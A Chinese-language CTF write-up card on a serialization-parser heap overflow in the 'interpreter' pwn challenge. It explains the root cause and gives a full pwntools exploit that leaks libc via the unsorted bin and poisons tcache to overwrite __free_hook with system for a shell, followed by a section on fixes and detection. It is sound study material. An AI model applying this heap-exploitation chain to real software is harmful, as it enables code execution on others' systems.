---
id: ctf-pwn-interpreter-serialization-expansion-heap-overflow
title: interpreter 序列化解析器重复字段膨胀堆溢出：unsorted bin 泄露 + tcache 毒化 __free_hook
type: scenario
domain: ctf
path: ctf/pwn
technique: serialization-parser-expansion-heap-overflow
tags:
- pwn
- heap
- ctf
- parser
- serialization
- overflow
- tcache
- free-hook
- libc-leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V92
  verified_at: '2026-11-05T19:47:07+08:00'
  notes: 已对照原文与唯一图01核对：add/delete/show协议、sub_CF7对title/subtitle/remark/author的重建、add data::title::subtitle:AAAABBBB 输出膨胀为 title::subtitle:AAAABBBB|subtitle::AAAABBBB、p32(0x601)溢出、unsorted bin泄露偏移0x3EBCA0、tcache毒化__free_hook+system的完整exp均与原文一致。图01仅证明膨胀/越界写，未展示最终flag；exp未在本机复跑，依赖题目libc与__free_hook；无组件影响版本，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/ctf/pwn/ctf-pwn-interpreter-serialization-expansion-heap-overflow/
draft: false
kb_aliases:
- interpreter 堆溢出
- 序列化 add 溢出
- 重复字段膨胀
- 解析器重建字符串越界
- tcache 毒化 __free_hook
- unsorted bin 泄露 libc
- 2025CCB interpreter
---

## 一句话结论

题目是一个带 `add/delete/show` 的序列化 CLI：`add data:...` 会把 `title/subtitle/remark/author` 字段重新序列化到 `strdup` 得到的缓冲区，但重复字段/冒号解析会让重建后的字符串比原缓冲区更长（如 `add data::title::subtitle:AAAABBBB` 输出膨胀成 `title::subtitle:AAAABBBB|subtitle::AAAABBBB`），从而写越界覆盖相邻堆块；利用堆布局把溢出转成 unsorted bin 泄露 libc，再用 tcache 毒化把 `__free_hook` 改成 `system`，最后 `delete` 触发 `/bin/sh` 的 free 拿到 shell。

## 原理

- **命令解析**：程序读取一行，按空格/冒号/结尾切分；`add data:<fields>` 进入 `add`，`delete index:<n>` 进入 `delete`，`show` 显示。`add` 用 `init_choice()` 在 16 个全局槽位（`heaplist + 16*n`）中找空槽，保存数据指针和长度。
- **字段序列化**：`sub_CF7(s2, s1a)` 按 `:`/`|` 扫描 `data` 后的字段，用 `strncmp` 匹配 `title`、`subtitle`、`remark`、`author`（`.rodata` 中的字符串表），把规范字段名、冒号和值重新写入同一个缓冲区 `a1_`。写入索引 `v9` 单调递增，遇到重复/空字段时会把字段再次展开，导致输出长度超过输入/分配长度。
- **膨胀示例**：输入 `add data::title::subtitle:AAAABBBB` 后 `show` 输出 `title::subtitle:AAAABBBB|subtitle::AAAABBBB`：`subtitle` 被重复序列化，重建字符串比原 `strdup` 块更长；`*(_BYTE *)(j + v17) = 0` 等写入越过原块边界，覆盖相邻 chunk 的 size/next。
- **长度记录**：`add` 把输入长度 `j` 写入 `*((_DWORD *)inited + 1)`，把 `s2` 写入 `*((_QWORD *)inited + 1)`；重建后的字符串长度可与记录的长度不一致，`show` 按记录长度/指针读取，进一步造成越界读/写。
- **利用链**：
  1. 堆布局：先分配不同大小的块（0x27、0xF7 等），释放部分制造空洞；
  2. 用膨胀输入触发溢出，覆盖相邻 chunk 的 size（如构造 0x601）或 next 指针；
  3. 释放/合并得到 unsorted bin 块，`show` 读出 `main_arena` 附近的 libc 指针（原文 Data #8），`libc_base = leak - 0x3EBCA0`（该 libc 的偏移）；
  4. tcache 毒化：用 0x127/0x126/0x125/0x120 的 add/delete 循环改写 tcache next 指向 `__free_hook`；
  5. 写入 `p64(system)` 到 `__free_hook`，再让程序 free 一个内容为 `/bin/sh\x00` 的块，触发 `system("/bin/sh")`。
- 该链依赖目标 libc 仍有 `__free_hook`（glibc 2.34 之前/部分发行版）；新 glibc 已移除 hook，需要改用 `exit_funcs`/FSOP/`_IO_list_all` 等路线；若开启 safe-linking，tcache next 需要按 `next ^ (chunk_addr >> 12)` 编码。

## 触发条件

- CTF pwn 题：本地/远程 ELF + libc，提供 `add/delete/show` 序列化 CLI。
- 解析器允许重复字段/空字段/冒号分隔，且重建缓冲区按输入长度分配、按膨胀后的内容写入（缺少目标长度校验）。
- 目标 libc 具有 unsorted bin 泄露与 `__free_hook`（或可替换的 hook/函数指针）；堆布局可预测/可 groom。
- 需要泄露 libc 基址（`show` 越界读或 unsorted bin）以及可控的 tcache 链。

## 利用步骤

1. 逆向 `add/delete/show`：确认 `add data:` 的字段解析、序列化写入函数（原文 `sub_CF7`）、全局槽位布局（16 项、指针+长度）。
2. 验证膨胀：发送 `add data::title::subtitle:AAAABBBB`，再 `show`，观察输出字段被重复拼接、长度超过输入。
3. 设计堆布局：按目标 chunk 大小分配（0x20/0x30/0x100/0x110 等），释放中间块制造空洞，确保溢出能覆盖下一个 chunk 的 size/next。
4. 构造溢出输入：利用重复字段/长值把重建字符串写到相邻块，伪造 size（如 0x601）或 next 指针；必要时先 `delete` 清空槽位。
5. 触发 unsorted bin：释放/合并出大于 tcache 上限的块，`show` 读取其中的 `main_arena` 指针；按目标 libc 偏移计算基址（原文 `0x3EBCA0`）。
6. tcache 毒化：用同 size 的 add/delete 序列改写 tcache next 指向 `__free_hook`（考虑 safe-linking 编码），再分配两次：第一次拿到目标地址前的块，第二次写入 `system`。
7. 写入 `/bin/sh\x00` 到可 free 的块，`delete` 触发 `__free_hook(chunk)`，即 `system("/bin/sh")`。
8. 交互拿 shell，读取 flag；远程时用 `pwntools remote` 替换本地 `process`。

## PoC

```python
from pwn import *

context.binary = elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
context.arch = "amd64"

def start():
    if args.REMOTE:
        return remote(args.HOST or "127.0.0.1", int(args.PORT or 9999))
    return process([os.fsencode(ld.path), b"--library-path", b".",
                    os.fsencode(elf.path)])

def add(io, data):
    io.recvuntil(b"user@machine$ ")
    io.sendline(b"add data:" + data)

def delete(io, idx):
    io.recvuntil(b"user@machine$ ")
    io.sendline(b"delete index:" + str(idx).encode())

def show(io):
    io.recvuntil(b"user@machine$ ")
    io.sendline(b"show ")

def exploit(io):
    add(io, b"A" * 0x27)
    add(io, b"A" * 0xF7)
    add(io, b"HHHHHH1")
    add(io, b"HHHHHH2")
    add(io, b"B" * 0xF7)
    add(io, b"C" * 0xF7)
    add(io, b"D" * 0xF7)
    add(io, b"E" * (0xF7 - 0x40))
    for _ in range(4):
        add(io, b"F" * 0xF7)

    delete(io, 0)
    delete(io, 2)
    delete(io, 3)

    # 触发解析器膨胀：重建字符串写越界
    add(io, b":title:AAAAAAAAA:subtitle:A" + p32(0x601))
    delete(io, 1)
    add(io, b"A" * 0x4F7)

    show(io)
    io.recvuntil(b"Data #8:\n")
    io.recvuntil(b": ")
    leak = u64(io.recv(6).ljust(8, b"\x00"))
    libc.address = leak - 0x3EBCA0
    log.success(f"libc base: {hex(libc.address)}")

    # tcache 毒化到 __free_hook
    delete(io, 1)
    add(io, b"Y" * 0x127)
    delete(io, 1)
    add(io, b"Y" * 0x126)
    delete(io, 1)
    add(io, b"Y" * 0x125)
    delete(io, 1)
    add(io, b"Y" * 0x120 + p64(libc.sym["__free_hook"]))

    add(io, b"/bin/sh\x00")
    add(io, p64(libc.sym["system"]))
    delete(io, 2)

def main():
    io = start()
    exploit(io)
    io.interactive()

if __name__ == "__main__":
    main()
```

```text
# 关键观测（原文）：
# add data::title::subtitle:AAAABBBB
# show -> title::subtitle:AAAABBBB|subtitle::AAAABBBB
# 说明重建字符串发生膨胀，是越界写的根因。
```

## 变体与关联

- **变体：解析器膨胀的触发方式**：重复字段、空字段、多个冒号/分隔符、大小写/前缀匹配（`strncmp` 只比较前缀）、超长值；不同解析器可能把“规范化/转义/合并”写成二次分配，需找“分配长度 < 重建长度”的不变量。
- **变体：泄露方式**：unsorted bin、large bin、tcache/fastbin 残留指针、`show` 越界读、`stdout` 部分覆写；按目标 libc 与分配大小选择。
- **变体：现代 glibc**：无 `__free_hook` 时改用 `exit_funcs`/`_IO_list_all`/FSOP/`__malloc_hook`（若存在）/`GOT`（Partial RELRO）等；safe-linking 需编码 tcache next。
- **关联卡片**：[[binary-pwn-heap-glibc243-tcache-key-bypass-got-system]]（tcache 毒化与 GOT 覆写）、[[binary-pwn-heap-freehook-setcontext61-bridge-orw]]（__free_hook + setcontext 的 ORW 链）、[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（unsorted bin 泄露）、[[ctf-pwn-hexfloat-strtoull-parser-differential]]（另一类解析器差异题）。
- **边界**：exp 依赖题目 libc 的 `0x3EBCA0` 偏移与 `__free_hook` 存在；远程环境需确认 libc/ld、ASLR 与堆行为；原文未在本机执行 exp，实际偏移需按附件核对。

## 检测与防御

- **代码修复**：序列化/规范化时先计算重建后的最大长度，再分配或扩容；写入前检查 `v9 + len < capacity`；对重复字段/空字段/超长值做限制；使用带边界的安全字符串 API。
- **运行时**：开启 ASAN/`FORTIFY_SOURCE`、glibc malloc check（`MALLOC_CHECK_=3`）、堆 canary；对解析器做 fuzz（libFuzzer/AFL）覆盖重复字段/分隔符边界。
- **CTF 环境**：使用较新 glibc（无 `__free_hook`）或开启 safe-linking 增加利用难度；限制远程二进制暴露的 libc 版本；对异常大输入/重复字段做长度校验。
- **检测**：堆破坏/`malloc(): corrupted`/`free(): invalid pointer` 崩溃日志、异常 `add` 输入长度与字段重复模式、`show` 越界读泄露指针；在真实应用中监控解析器崩溃与内存错误。
